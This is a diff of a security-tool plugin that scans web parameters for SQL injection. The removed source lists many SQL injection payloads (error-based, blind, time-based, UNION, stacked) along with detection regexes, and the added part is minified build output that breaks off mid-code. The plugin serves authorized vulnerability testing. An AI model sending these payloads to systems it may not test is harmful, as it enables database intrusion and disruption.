@@ -3,7 +3,7 @@
  *
  * @plugin sql_injection_scanner
  * @name SQL Injection Scanner
- * @version 1.1.5
+ * @version 1.1.6
  * @author Sentinel Team
  * @main_category agent
  * @monitor_type risk
@@ -11,917 +11,195 @@
  * @target_asset_types ["web"]
  * @category vuln
  * @default_severity critical
- * @tags sqli, sql-injection, vulnerability, security, web, owasp, database
+ * @tags sqli, sql-injection, vulnerability, security, web, owasp, database, capability:fetch, capability:monitor-events, monitor:results-stream-v2
  * @description Active SQL injection vulnerability scanner that tests parameters with various payloads including error-based, blind, and time-based techniques
+ * @target_sources ["surface_asset","bounty_asset","scope"]
+ * @seed_bindings []
  */
-
-// Sentinel Dictionary API declaration
-declare const Sentinel: {
-    Dictionary: {
-        get(idOrName: string): Promise<any>;
-        getWords(idOrName: string, limit?: number): Promise<string[]>;
-        list(filter?: { dictType?: string; category?: string }): Promise<any[]>;
-        getMergedWords(idsOrNames: string[], deduplicate?: boolean): Promise<string[]>;
-    };
-    log(level: string, message: string): void;
-};
-
-interface ToolInput {
-    url: string;
-    method?: string;
-    params?: Record<string, string>;
-    headers?: Record<string, string>;
-    body?: string;
-    contentType?: string;
-    userAgent?: string;
-    testErrorBased?: boolean;
-    testBlind?: boolean;
-    testTimeBased?: boolean;
-    testUnion?: boolean;
-    dbType?: string;
-    customPayloads?: string[];
-    dictionaryId?: string;
-    timeThreshold?: number;
-}
-
-interface SqliTest {
-    parameter: string;
-    location: string;
-    payload: string;
-    technique: string;
-    vulnerable: boolean;
-    confidence: string;
-    evidence?: string;
-    dbType?: string;
-    responseCode?: number;
-    responseTime?: number;
-    baselineTime?: number;
-}
-
-interface ToolOutput {
-    success: boolean;
-    data?: {
-        url: string;
-        method: string;
-        tests: SqliTest[];
-        summary: {
-            totalTests: number;
-            vulnerableCount: number;
-            testedParameters: string[];
-            vulnerableParameters: string[];
-            detectedDbTypes: string[];
-        };
-    };
-    error?: string;
-}
-
-type PluginGlobals = typeof globalThis & {
-    get_input_schema?: typeof get_input_schema;
-    get_output_schema?: typeof get_output_schema;
-    analyze?: typeof analyze;
-};
-
-const pluginGlobals = globalThis as PluginGlobals;
-
-const DEFAULT_CONCURRENCY = 3;
-const MAX_CONCURRENCY = 8;
-const MAX_BASELINE_CONCURRENCY = 4;
-
-// SQL error patterns by database type
-const SQL_ERROR_PATTERNS: Record<string, RegExp[]> = {
-    mysql: [
-        /SQL syntax.*?MySQL/i,
-        /Warning.*?mysql_/i,
-        /MySQLSyntaxErrorException/i,
-        /valid MySQL result/i,
-        /check the manual that corresponds to your MySQL server version/i,
-        /MySqlClient\./i,
-        /com\.mysql\.jdbc/i,
-        /Unclosed quotation mark after the character string/i,
-        /SQLSTATE\[42000\]/i,
-        /mysql_fetch_array\(\)/i,
-        /mysql_num_rows\(\)/i,
-        /MySQL Query fail/i,
-    ],
-    
-    postgresql: [
-        /PostgreSQL.*?ERROR/i,
-        /Warning.*?pg_/i,
-        /valid PostgreSQL result/i,
-        /Npgsql\./i,
-        /PG::SyntaxError/i,
-        /org\.postgresql\.util\.PSQLException/i,
-        /ERROR:\s+syntax error at or near/i,
-        /ERROR: parser: parse error at or near/i,
-        /PostgreSQL query failed/i,
-        /PSQLException/i,
-    ],
-    
-    mssql: [
-        /Driver.*? SQL[\-\_\ ]*Server/i,
-        /OLE DB.*? SQL Server/i,
-        /\bSQL Server[^&lt;&quot;]+Driver/i,
-        /Warning.*?mssql_/i,
-        /\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}/i,
-        /System\.Data\.SqlClient\.SqlException/i,
-        /Exception.*?\WSystem\.Data\.SqlClient\./i,
-        /Exception.*?\WRoadhouse\.Cms\./i,
-        /Microsoft SQL Native Client error '[0-9a-fA-F]{8}/i,
-        /\[SQL Server\]/i,
-        /ODBC SQL Server Driver/i,
-        /ODBC Driver \d+ for SQL Server/i,
-        /SQLServer JDBC Driver/i,
-        /com\.microsoft\.sqlserver\.jdbc/i,
-        /macabordar\.telefonicamovistar\.com/i,
-        /Unclosed quotation mark after the character string/i,
-    ],
-    
-    oracle: [
-        /\bORA-[0-9][0-9][0-9][0-9]/i,
-        /Oracle error/i,
-        /Oracle.*?Driver/i,
-        /Warning.*?oci_/i,
-        /Warning.*?ora_/i,
-        /oracle\.jdbc\.driver/i,
-        /quoted string not properly terminated/i,
-        /SQL command not properly ended/i,
-    ],
-    
-    sqlite: [
-        /SQLite\/JDBCDriver/i,
-        /SQLite\.Exception/i,
-        /System\.Data\.SQLite\.SQLiteException/i,
-        /Warning.*?sqlite_/i,
-        /Warning.*?SQLite3::/i,
-        /\[SQLITE_ERROR\]/i,
-        /SQLite error \d+:/i,
-        /sqlite3\.OperationalError:/i,
-        /SQLite3::SQLException/i,
-        /org\.sqlite\.JDBC/i,
-        /SQLiteException/i,
-    ],
-    
-    generic: [
-        /SQL syntax/i,
-        /syntax error/i,
-        /mysql_fetch/i,
-        /num_rows/i,
-        /Incorrect syntax near/i,
-        /Unclosed quotation mark/i,
-        /quoted string not properly terminated/i,
-        /You have an error in your SQL syntax/i,
-        /supplied argument is not a valid/i,
-        /Division by zero/i,
-        /ODBC.*?Driver/i,
-        /Error Executing Database Query/i,
-        /DB2 SQL error/i,
-        /Sybase message/i,
-        /Ingres SQLSTATE/i,
-        /Informix ODBC Driver/i,
-    ],
-};
-
-// SQL injection payloads by technique
-const SQLI_PAYLOADS: Record<string, { payload: string; technique: string; dbType?: string }[]> = {
-    error_based: [
-        // Generic
-        { payload: "'", technique: "error", dbType: "generic" },
-        { payload: "\"", technique: "error", dbType: "generic" },
-        { payload: "'--", technique: "error", dbType: "generic" },
-        { payload: "\"--", technique: "error", dbType: "generic" },
-        { payload: "' OR '1'='1", technique: "error", dbType: "generic" },
-        { payload: "\" OR \"1\"=\"1", technique: "error", dbType: "generic" },
-        { payload: "' OR '1'='1'--", technique: "error", dbType: "generic" },
-        { payload: "' OR '1'='1'/*", technique: "error", dbType: "generic" },
-        { payload: "1' AND '1'='1", technique: "error", dbType: "generic" },
-        { payload: "1\" AND \"1\"=\"1", technique: "error", dbType: "generic" },
-        { payload: "' AND 1=1--", technique: "error", dbType: "generic" },
-        { payload: "' AND 1=2--", technique: "error", dbType: "generic" },
-        { payload: "admin'--", technique: "error", dbType: "generic" },
-        { payload: "') OR ('1'='1", technique: "error", dbType: "generic" },
-        { payload: "')) OR (('1'='1", technique: "error", dbType: "generic" },
-        
-        // MySQL specific
-        { payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", technique: "error", dbType: "mysql" },
-        { payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", technique: "error", dbType: "mysql" },
-        { payload: "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", technique: "error", dbType: "mysql" },
-        
-        // MSSQL specific
-        { payload: "' AND 1=CONVERT(int,@@version)--", technique: "error", dbType: "mssql" },
-        { payload: "'; WAITFOR DELAY '0:0:0'--", technique: "error", dbType: "mssql" },
-        
-        // PostgreSQL specific
-        { payload: "' AND 1=CAST(VERSION() AS INT)--", technique: "error", dbType: "postgresql" },
-        { payload: "'::int", technique: "error", dbType: "postgresql" },
-        
-        // Oracle specific
-        { payload: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", technique: "error", dbType: "oracle" },
-    ],
-    
-    blind_boolean: [
-        { payload: "' AND 1=1--", technique: "blind-boolean", dbType: "generic" },
-        { payload: "' AND 1=2--", technique: "blind-boolean", dbType: "generic" },
-        { payload: "' AND 'a'='a", technique: "blind-boolean", dbType: "generic" },
-        { payload: "' AND 'a'='b", technique: "blind-boolean", dbType: "generic" },
-        { payload: "1' AND 1=1--", technique: "blind-boolean", dbType: "generic" },
-        { payload: "1' AND 1=2--", technique: "blind-boolean", dbType: "generic" },
-        { payload: "' OR 1=1--", technique: "blind-boolean", dbType: "generic" },
-        { payload: "' OR 1=2--", technique: "blind-boolean", dbType: "generic" },
-        { payload: "1 AND 1=1", technique: "blind-boolean", dbType: "generic" },
-        { payload: "1 AND 1=2", technique: "blind-boolean", dbType: "generic" },
-    ],
-    
-    time_based: [
-        // MySQL
-        { payload: "' AND SLEEP(5)--", technique: "time-based", dbType: "mysql" },
-        { payload: "' OR SLEEP(5)--", technique: "time-based", dbType: "mysql" },
-        { payload: "1' AND SLEEP(5)--", technique: "time-based", dbType: "mysql" },
-        { payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", technique: "time-based", dbType: "mysql" },
-        { payload: "' AND BENCHMARK(5000000,SHA1('test'))--", technique: "time-based", dbType: "mysql" },
-        
-        // MSSQL
-        { payload: "'; WAITFOR DELAY '0:0:5'--", technique: "time-based", dbType: "mssql" },
-        { payload: "' WAITFOR DELAY '0:0:5'--", technique: "time-based", dbType: "mssql" },
-        { payload: "1; WAITFOR DELAY '0:0:5'--", technique: "time-based", dbType: "mssql" },
-        
-        // PostgreSQL
-        { payload: "' AND pg_sleep(5)--", technique: "time-based", dbType: "postgresql" },
-        { payload: "'; SELECT pg_sleep(5)--", technique: "time-based", dbType: "postgresql" },
-        { payload: "1' AND pg_sleep(5)--", technique: "time-based", dbType: "postgresql" },
-        
-        // Oracle
-        { payload: "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", technique: "time-based", dbType: "oracle" },
-        { payload: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", technique: "time-based", dbType: "oracle" },
-        
-        // SQLite
-        { payload: "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", technique: "time-based", dbType: "sqlite" },
-    ],
-    
-    union_based: [
-        { payload: "' UNION SELECT NULL--", technique: "union", dbType: "generic" },
-        { payload: "' UNION SELECT NULL,NULL--", technique: "union", dbType: "generic" },
-        { payload: "' UNION SELECT NULL,NULL,NULL--", technique: "union", dbType: "generic" },
-        { payload: "' UNION SELECT 1--", technique: "union", dbType: "generic" },
-        { payload: "' UNION SELECT 1,2--", technique: "union", dbType: "generic" },
-        { payload: "' UNION SELECT 1,2,3--", technique: "union", dbType: "generic" },
-        { payload: "' UNION ALL SELECT NULL--", technique: "union", dbType: "generic" },
-        { payload: "' UNION ALL SELECT NULL,NULL--", technique: "union", dbType: "generic" },
-        { payload: "1' UNION SELECT NULL--", technique: "union", dbType: "generic" },
-        { payload: "1' UNION SELECT 1,2,3--", technique: "union", dbType: "generic" },
-        { payload: "') UNION SELECT NULL--", technique: "union", dbType: "generic" },
-        { payload: "')) UNION SELECT NULL--", technique: "union", dbType: "generic" },
-    ],
-    
-    stacked: [
-        { payload: "'; SELECT 1--", technique: "stacked", dbType: "generic" },
-        { payload: "'; SELECT @@version--", technique: "stacked", dbType: "mssql" },
-        { payload: "'; SELECT version()--", technique: "stacked", dbType: "mysql" },
-        { payload: "'; SELECT version()--", technique: "stacked", dbType: "postgresql" },
-    ],
-};
-
-/**
- * Export input schema
- */
-export function get_input_schema() {
-    return {
-        type: "object",
-        required: ["url"],
-        properties: {
-            url: {
-                type: "string",
-                description: "Target URL to test for SQL injection vulnerabilities"
-            },
-            method: {
-                type: "string",
-                enum: ["GET", "POST", "PUT", "PATCH"],
-                description: "HTTP method to use",
-                default: "GET"
-            },
-            params: {
-                type: "object",
-                description: "URL parameters to test (key-value pairs)",
-                additionalProperties: { type: "string" }
-            },
-            headers: {
-                type: "object",
-                description: "Custom headers to include",
-                additionalProperties: { type: "string" }
-            },
-            body: {
-                type: "string",
-                description: "Request body (for POST/PUT/PATCH)"
-            },
-            contentType: {
-                type: "string",
-                description: "Content-Type header",
-                default: "application/x-www-form-urlencoded"
-            },
-            userAgent: {
-                type: "string",
-                description: "Custom User-Agent header"
-            },
-            testErrorBased: {
-                type: "boolean",
-                description: "Test for error-based SQL injection",
-                default: true
-            },
-            testBlind: {
-                type: "boolean",
-                description: "Test for blind boolean-based SQL injection",
-                default: true
-            },
-            testTimeBased: {
-                type: "boolean",
-                description: "Test for time-based blind SQL injection",
-                default: true
-            },
-            testUnion: {
-                type: "boolean",
-                description: "Test for UNION-based SQL injection",
-                default: true
-            },
-            dbType: {
-                type: "string",
-                enum: ["auto", "mysql", "postgresql", "mssql", "oracle", "sqlite"],
-                description: "Target database type (auto for detection)",
-                default: "auto"
-            },
-            customPayloads: {
-                type: "array",
-                items: { type: "string" },
-                description: "Custom SQL injection payloads to test"
-            },
-            dictionaryId: {
-                type: "string",
-                "x-control": "dictionary-picker",
-                "x-dictionary-type": "sql_injection_payload",
-                description: "Dictionary ID or name for SQLi payloads"
-            },
-            timeThreshold: {
-                type: "integer",
-                description: "Time threshold in ms for time-based detection",
-                default: 5000,
-                minimum: 3000,
-                maximum: 30000
-            }
-        }
-    };
-}
-
-pluginGlobals.get_input_schema = get_input_schema;
-
-/**
- * Export output schema
- */
-export function get_output_schema() {
-    return {
-        type: "object",
-        properties: {
-            success: { type: "boolean", description: "Whether the operation succeeded" },
-            data: {
-                type: "object",
-                properties: {
-                    url: { type: "string", description: "Target URL" },
-                    method: { type: "string" },
-                    tests: {
-                        type: "array",
-                        items: {
-                            type: "object",
-                            properties: {
-                                parameter: { type: "string" },
-                                payload: { type: "string" },
-                                technique: { type: "string" },
-                                vulnerable: { type: "boolean" },
-                                confidence: { type: "string" },
-                                dbType: { type: "string" },
-                                evidence: { type: "string" }
-                            }
-                        },
-                        description: "SQL injection test results"
-                    },
-                    summary: {
-                        type: "object",
-                        properties: {
-                            totalTests: { type: "integer" },
-                            vulnerableCount: { type: "integer" },
-                            vulnerableParameters: { type: "array", items: { type: "string" } },
-                            detectedDbTypes: { type: "array", items: { type: "string" } }
-                        }
-                    }
-                }
-            },
-            error: { type: "string", description: "Error message if failed" }
-        }
-    };
-}
-
-pluginGlobals.get_output_schema = get_output_schema;
-
-/**
- * Extract parameters from URL and body
- */
-function extractParameters(
-    url: string,
-    body?: string,
-    contentType?: string,
-    providedParams?: Record<string, string>
-): Map<string, { value: string; location: "query" | "body" | "provided" }> {
-    const params = new Map<string, { value: string; location: "query" | "body" | "provided" }>();
-    
-    if (providedParams) {
-        for (const [key, value] of Object.entries(providedParams)) {
-            params.set(key, { value, location: "provided" });
-        }
-    }
-    
-    try {
-        const urlObj = new URL(url);
-        urlObj.searchParams.forEach((value, key) => {
-            if (!params.has(key)) {
-                params.set(key, { value, location: "query" });
-            }
-        });
-    } catch {
-        const match = url.match(/\?(.+)/);
-        if (match) {
-            match[1].split("&").forEach(pair => {
-                const [key, ...rest] = pair.split("=");
-                if (key && !params.has(key)) {
-                    params.set(key, {
-                        value: decodeURIComponent(rest.join("=")),
-                        location: "query"
-                    });
-                }
-            });
-        }
-    }
-    
-    if (body) {
-        if (contentType?.includes("application/json")) {
-            try {
-                const json = JSON.parse(body);
-                const flatten = (obj: any, prefix = "") => {
-                    for (const [key, value] of Object.entries(obj)) {
-                        const fullKey = prefix ? `${prefix}.${key}` : key;
-                        if (typeof value === "object" && value !== null && !Array.isArray(value)) {
-                            flatten(value, fullKey);
-                        } else if ((typeof value === "string" || typeof value === "number") && !params.has(fullKey)) {
-                            params.set(fullKey, { value: String(value), location: "body" });
-                        }
-                    }
-                };
-                flatten(json);
-            } catch { /* ignore */ }
-        } else {
-            body.split("&").forEach(pair => {
-                const [key, ...rest] = pair.split("=");
-                if (key && !params.has(key)) {
-                    params.set(key, {
-                        value: decodeURIComponent(rest.join("=")),
-                        location: "body"
-                    });
-                }
-            });
-        }
-    }
-    
-    return params;
-}
-
-/**
- * Build URL with payload
- */
-function buildTestUrl(baseUrl: string, paramName: string, payload: string): string {
-    try {
-        const url = new URL(baseUrl);
-        url.searchParams.set(paramName, payload);
-        return url.toString();
-    } catch {
-        const separator = baseUrl.includes("?") ? "&" : "?";
-        return `${baseUrl}${separator}${encodeURIComponent(paramName)}=${encodeURIComponent(payload)}`;
-    }
-}
-
-/**
- * Build body with payload
- */
-function buildTestBody(
-    originalBody: string | undefined,
-    paramName: string,
-    payload: string,
-    contentType?: string
-): string {
-    if (contentType?.includes("application/json")) {
-        try {
-            const json = JSON.parse(originalBody || "{}");
-            const parts = paramName.split(".");
-            let current = json;
-            for (let i = 0; i < parts.length - 1; i++) {
-                if (!current[parts[i]]) current[parts[i]] = {};
-                current = current[parts[i]];
-            }
-            current[parts[parts.length - 1]] = payload;
-            return JSON.stringify(json);
-        } catch {
-            return originalBody || "";
-        }
-    } else {
-        const params = new URLSearchParams(originalBody || "");
-        params.set(paramName, payload);
-        return params.toString();
-    }
-}
-
-/**
- * Check for SQL error patterns in response
- */
-function detectSqlError(body: string): { detected: boolean; dbType: string; evidence: string } {
-    for (const [dbType, patterns] of Object.entries(SQL_ERROR_PATTERNS)) {
-        for (const pattern of patterns) {
-            const match = body.match(pattern);
-            if (match) {
-                const index = body.indexOf(match[0]);
-                const start = Math.max(0, index - 50);
-                const end = Math.min(body.length, index + match[0].length + 50);
-                return {
-                    detected: true,
-                    dbType: dbType === "generic" ? "unknown" : dbType,
-                    evidence: body.substring(start, end),
-                };
-            }
-        }
-    }
-    return { detected: false, dbType: "", evidence: "" };
-}
-
-/**
- * Compare responses for blind detection
- */
-function compareResponses(baseline: string, test: string): number {
-    if (baseline === test) return 1.0;
-    if (baseline.length === 0 || test.length === 0) return 0;
-    
-    // Simple similarity based on length
-    const lengthDiff = Math.abs(baseline.length - test.length);
-    const maxLength = Math.max(baseline.length, test.length);
-    const lengthSimilarity = 1 - (lengthDiff / maxLength);
-    
-    return lengthSimilarity;
-}
-
-/**
- * Run tasks with bounded concurrency. Host enforces global direct-fetch limit.
- */
-async function runWithConcurrency<T>(tasks: Array<() => Promise<T>>, concurrency: number): Promise<T[]> {
-    if (tasks.length === 0) {
-        return [];
-    }
-
-    const limit = Math.max(1, Math.min(concurrency, tasks.length));
-    const results = new Array<T>(tasks.length);
-    let nextIndex = 0;
-
-    const workers = Array.from({ length: limit }, async () => {
-        while (true) {
-            const index = nextIndex++;
-            if (index >= tasks.length) {
-                return;
-            }
-            results[index] = await tasks[index]();
-        }
-    });
-
-    await Promise.all(workers);
-    return results;
-}
-
-function fetchTimeoutForTechnique(technique: string, timeThreshold: number): number {
-    if (technique === "time-based") {
-        return Math.max(timeThreshold + 2000, 8000);
-    }
-    return 10000;
-}
-
-/**
- * Load payloads from dictionary or use built-in
- */
-async function loadPayloads(
-    dictionaryId?: string,
-    customPayloads?: string[],
-    testErrorBased?: boolean,
-    testBlind?: boolean,
-    testTimeBased?: boolean,
-    testUnion?: boolean,
-    targetDbType?: string
-): Promise<{ payload: string; technique: string; dbType?: string }[]> {
-    const payloads: { payload: string; technique: string; dbType?: string }[] = [];
-    
-    // Custom payloads first
-    if (customPayloads && customPayloads.length > 0) {
-        for (const p of customPayloads) {
-            payloads.push({ payload: p, technique: "custom", dbType: "generic" });
-        }
-    }
-    
-    // Try dictionary
-    if (dictionaryId) {
-        try {
-            if (typeof Sentinel !== "undefined" && Sentinel.Dictionary) {
-                const words = await Sentinel.Dictionary.getWords(dictionaryId);
-                if (words && words.length > 0) {
-                    for (const p of words) {
-                        payloads.push({ payload: p, technique: "dictionary", dbType: "generic" });
-                    }
-                    return payloads;
-                }
-            }
-        } catch (e) {
-            console.debug(`Failed to load SQLi dictionary: ${e}`);
-        }
-    }
-    
-    // Filter by database type
-    const filterByDb = (items: { payload: string; technique: string; dbType?: string }[]) => {
-        if (!targetDbType || targetDbType === "auto") return items;
-        return items.filter(i => !i.dbType || i.dbType === "generic" || i.dbType === targetDbType);
-    };
-    
-    // Use built-in payloads
-    if (testErrorBased !== false) {
-        payloads.push(...filterByDb(SQLI_PAYLOADS.error_based));
-    }
-    
-    if (testBlind !== false) {
-        payloads.push(...filterByDb(SQLI_PAYLOADS.blind_boolean));
-    }
-    
-    if (testTimeBased !== false) {
-        payloads.push(...filterByDb(SQLI_PAYLOADS.time_based));
-    }
-    
-    if (testUnion !== false) {
-        payloads.push(...filterByDb(SQLI_PAYLOADS.union_based));
-    }
-
-    const uniquePayloads = new Map<string, { payload: string; technique: string; dbType?: string }>();
-    for (const payload of payloads) {
-        const key = `${payload.technique}:${payload.dbType || "generic"}:${payload.payload}`;
-        if (!uniquePayloads.has(key)) {
-            uniquePayloads.set(key, payload);
-        }
-    }
-
-    return Array.from(uniquePayloads.values());
-}
-
-/**
- * Main analysis function
- */
-export async function analyze(input: ToolInput): Promise<ToolOutput> {
-    const startTime = performance.now();
-    
-    try {
-        // Validate input
-        if (!input.url || typeof input.url !== "string") {
-            return {
-                success: false,
-                error: "Invalid input: url parameter is required"
-            };
-        }
-        
-        let baseUrl = input.url;
-        if (!baseUrl.startsWith("http://") && !baseUrl.startsWith("https://")) {
-            baseUrl = `https://${baseUrl}`;
-        }
-        
-        const method = (input.method || "GET").toUpperCase();
-        const userAgent = input.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
-        const contentType = input.contentType || "application/x-www-form-urlencoded";
-        const timeThreshold = input.timeThreshold || 5000;
-        
-        // Extract parameters
-        const params = extractParameters(baseUrl, input.body, contentType, input.params);
-        
-        if (params.size === 0) {
-            return {
-                success: false,
-                error: "No parameters found to test. Provide params or use a URL with query parameters."
-            };
-        }
-        
-        // Load payloads
-        const payloads = await loadPayloads(
-            input.dictionaryId,
-            input.customPayloads,
-            input.testErrorBased,
-            input.testBlind,
-            input.testTimeBased,
-            input.testUnion,
-            input.dbType
-        );
-        
-        const tests: SqliTest[] = [];
-        const vulnerableParams = new Set<string>();
-        const detectedDbTypes = new Set<string>();
-        const compromisedParams = new Set<string>();
-        
-        // Get baseline response for each parameter
-        const baselines = new Map<string, { body: string; time: number }>();
-
-        await runWithConcurrency(Array.from(params.entries()).map(([paramName, { value, location }]) => async () => {
-                try {
-                    let testUrl = baseUrl;
-                    let testBody = input.body;
-
-                    if (location === "query" || location === "provided") {
-                        testUrl = buildTestUrl(baseUrl, paramName, value);
-                    }
-
-                    const headers: Record<string, string> = {
-                        "User-Agent": userAgent,
-                        "Accept": "*/*",
-                        ...input.headers,
-                    };
-
-                    if (method !== "GET" && testBody) {
-                        headers["Content-Type"] = contentType;
-                    }
-
-                    const startReq = performance.now();
-                    const response = await fetch(testUrl, {
-                        method,
-                        headers,
-                        body: method !== "GET" ? testBody : undefined,
-                        timeout: 10000,
-                    });
-                    const baselineTime = Math.round(performance.now() - startReq);
-                    const body = await response.text();
-
-                    baselines.set(paramName, { body, time: baselineTime });
-                } catch {
-                    // Ignore baseline errors
-                }
-                return null;
-            }), DEFAULT_CONCURRENCY);
-        
-        // Create test tasks
-        const tasks: (() => Promise<SqliTest | null>)[] = [];
-        
-        for (const [paramName, { value, location }] of params) {
-            const baseline = baselines.get(paramName);
-            
-            for (const { payload, technique, dbType } of payloads) {
-                tasks.push(async () => {
-                    if (compromisedParams.has(paramName)) {
-                        return null;
-                    }
-
-                    const testStart = performance.now();
-                    
-                    try {
-                        let testUrl = baseUrl;
-                        let testBody = input.body;
-                        
-                        // Append payload to original value
-                        const testValue = value + payload;
-                        
-                        if (location === "query" || location === "provided") {
-                            testUrl = buildTestUrl(baseUrl, paramName, testValue);
-                        } else if (location === "body") {
-                            testBody = buildTestBody(input.body, paramName, testValue, contentType);
-                        }
-                        
-                        const headers: Record<string, string> = {
-                            "User-Agent": userAgent,
-                            "Accept": "*/*",
-                            ...input.headers,
-                        };
-                        
-                        if (method !== "GET" && testBody) {
-                            headers["Content-Type"] = contentType;
-                        }
-                        
-                        const response = await fetch(testUrl, {
-                            method,
-                            headers,
-                            body: method !== "GET" ? testBody : undefined,
-                            timeout: fetchTimeoutForTechnique(technique, timeThreshold),
-                        });
-                        
-                        const responseTime = Math.round(performance.now() - testStart);
-                        const body = await response.text();
-                        
-                        // Check for error-based SQLi
-                        if (technique === "error" || technique === "custom" || technique === "dictionary") {
-                            const errorResult = detectSqlError(body);
-                            if (errorResult.detected) {
-                                compromisedParams.add(paramName);
-                                return {
-                                    parameter: paramName,
-                                    location,
-                                    payload,
-                                    technique: "error-based",
-                                    vulnerable: true,
-                                    confidence: "high",
-                                    evidence: errorResult.evidence.substring(0, 300),
-                                    dbType: errorResult.dbType,
-                                    responseCode: response.status,
-                                    responseTime,
-                                    baselineTime: baseline?.time,
-                                };
-                            }
-                        }
-                        
-                        // Check for time-based SQLi
-                        if (technique === "time-based" && baseline) {
-                            const timeDiff = responseTime - baseline.time;
-                            if (timeDiff >= timeThreshold - 1000) {
-                                compromisedParams.add(paramName);
-                                return {
-                                    parameter: paramName,
-                                    location,
-                                    payload,
-                                    technique: "time-based",
-                                    vulnerable: true,
-                                    confidence: timeDiff >= timeThreshold ? "high" : "medium",
-                                    evidence: `Response delayed by ${timeDiff}ms (baseline: ${baseline.time}ms, test: ${responseTime}ms)`,
-                                    dbType: dbType || "unknown",
-                                    responseCode: response.status,
-                                    responseTime,
-                                    baselineTime: baseline.time,
-                                };
-                            }
-                        }
-                        
-                        // Check for blind boolean-based SQLi
-                        if (technique === "blind-boolean" && baseline) {
-                            const similarity = compareResponses(baseline.body, body);
-                            // Significant difference might indicate SQLi
-                            if (similarity < 0.8 && response.status === 200) {
-                                // Need to verify with opposite condition
-                                // This is a simplified check
-                                return null;
-                            }
-                        }
-                        
-                        return null;
-                        
-                    } catch (e: any) {
-                        return null;
-                    }
-                });
-            }
-        }
-        
-        // Execute tests with bounded plugin concurrency
-        const results = await runWithConcurrency(tasks, DEFAULT_CONCURRENCY);
-        
-        // Collect results
-        for (const result of results) {
-            if (result && result.vulnerable) {
-                tests.push(result);
-                vulnerableParams.add(result.parameter);
-                if (result.dbType && result.dbType !== "unknown") {
-                    detectedDbTypes.add(result.dbType);
-                }
-            }
-        }
-        
-        // Deduplicate by parameter and technique (keep highest confidence)
-        const uniqueTests = new Map<string, SqliTest>();
-        for (const test of tests) {
-            const key = `${test.parameter}:${test.technique}`;
-            const existing = uniqueTests.get(key);
-            if (!existing || (test.confidence === "high" && existing.confidence !== "high")) {
-                uniqueTests.set(key, test);
-            }
-        }
-        
-        const finalTests = Array.from(uniqueTests.values());
-        
-        return {
-            success: true,
-            data: {
-                url: baseUrl,
-                method,
-                tests: finalTests,
-                summary: {
-                    totalTests: tasks.length,
-                    vulnerableCount: finalTests.length,
-                    testedParameters: Array.from(params.keys()),
-                    vulnerableParameters: Array.from(vulnerableParams),
-                    detectedDbTypes: Array.from(detectedDbTypes),
-                },
-            },
-        };
-        
-    } catch (error: any) {
-        return {
-            success: false,
-            error: error instanceof Error ? error.message : String(error),
-        };
-    }
-}
-
-pluginGlobals.analyze = analyze;
+// Generated by scripts/build_monitor_plugins.mjs from source/agent/sql_injection_scanner/index.ts; edit the source modules.
+var MONITOR_DELTA_INPUT_FIELDS=["targets","target_objects","service_targets","__monitorExecution","previousSnapshots","previous_snapshots","dictionaryEntries","\
+dictionary"];function isJsonObject(value){return value!==null&&typeof value==="object"&&!Array.isArray(value)}function serializedBytes(text){let bytes=0;for(let index=0;index<
+text.length;index++){const code=text.charCodeAt(index);if(code<128)bytes++;else if(code<2048)bytes+=2;else if(code>=55296&&code<=56319){bytes+=4;index++}else bytes+=
+3}return bytes}function jsonBytes(value){return serializedBytes(JSON.stringify(value))}function objectNode(members){let bytes=2+Math.max(0,members.size-1);const entries=[];
+for(const[key,entry]of members){bytes+=entry.keyBytes+1+entry.node.bytes;entries.push([key,entry.node.value])}return{kind:"object",value:Object.fromEntries(entries),
+bytes,members}}function node(value){if(Array.isArray(value)){let bytes=2+Math.max(0,value.length-1);for(const item of value)bytes+=node(item).bytes;return{kind:"\
+array",value,bytes}}if(isJsonObject(value)){return objectNode(new Map(Object.entries(value).map(([key,value2])=>[key,{keyBytes:jsonBytes(key),node:node(value2)}])))}
+return{kind:"scalar",value,bytes:jsonBytes(value)}}function validateDeltaData(data){if(!isJsonObject(data)){throw new Error("Monitor result delta must contain s\
+uccess:true and an object data")}for(const key of MONITOR_DELTA_INPUT_FIELDS){if(Object.prototype.hasOwnProperty.call(data,key)){throw new Error(`Monitor result\
+ delta must not repeat execution input field data.${key}`)}}if(data.snapshots!==void 0&&!isJsonObject(data.snapshots)){throw new Error("Monitor snapshot delta m\
+ust be an object")}}function copyMonitorDelta(output){if(!isJsonObject(output)||output.success!==true){throw new Error("Monitor result delta must contain succes\
+s:true and an object data")}validateDeltaData(output.data);const data=JSON.parse(JSON.stringify(output.data));validateDeltaData(data);return node(data)}var EMPTY_REQUEST_BYTES=jsonBytes({sequence:0,work:[]});function monitorRequestBytes(sequence,workContentsBytes){return EMPTY_REQUEST_BYTES-1+jsonBytes(sequence)+
+workContentsBytes}var MAX_WORK_ITEMS=32;var MAX_JSON_BYTES=2*1024*1024;var COMMIT_INTERVAL_MS=5e3;function positiveLimit(value,maximum,label){if(!Number.isInteger(value)||Number(
+value)<1||Number(value)>maximum){throw new Error(`Monitor result stream ${label} must be an integer between 1 and ${maximum}`)}return Number(value)}function createMonitorResultStream(input){
+const context=isJsonObject(input)?input.__monitorExecution:void 0;if(context===void 0){return{enabled:false,assertHealthy(){},async record(_target,_key,_output,_options){},
+async finish(finalOutput){return finalOutput}}}if(!isJsonObject(context)||!isJsonObject(context.result_stream)||context.result_stream.protocol!=="monitor-result\
+s-v2"){throw new Error("Monitor execution requires the monitor-results-v2 result stream")}const monitor=globalThis.Sentinel?.Monitor;if(typeof monitor?.commitResults!==
+"function"){throw new Error("Monitor execution requires Sentinel.Monitor.commitResults")}const stream=context.result_stream;if(!Array.isArray(stream.targets)||stream.
+targets.some(target=>typeof target!=="string"||!target)){throw new Error("Monitor result stream requires the host-owned targets array")}const expected=new Set(stream.
